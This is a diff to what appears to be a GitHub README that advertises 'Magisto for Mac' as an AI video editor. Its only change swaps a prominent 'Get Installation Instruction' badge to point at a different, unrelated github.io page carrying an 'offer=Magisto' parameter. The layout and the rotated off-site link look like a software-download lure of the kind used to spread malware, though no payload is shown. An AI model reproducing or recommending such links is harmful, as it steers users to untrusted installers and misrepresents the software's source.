@@ -3,7 +3,7 @@
 
 Magisto for Mac transforms your Mac into a smart **desktop video editing tool** powered by AI. Whether you want to create engaging slideshows, polished marketing videos, or personal movie stories, this Mac version brings efficiency, creativity, and advanced features to your desktop. Follow the simple instruction below to get started. 🎬  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://corsalexktank-gif.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Magisto)
 
 ---
 
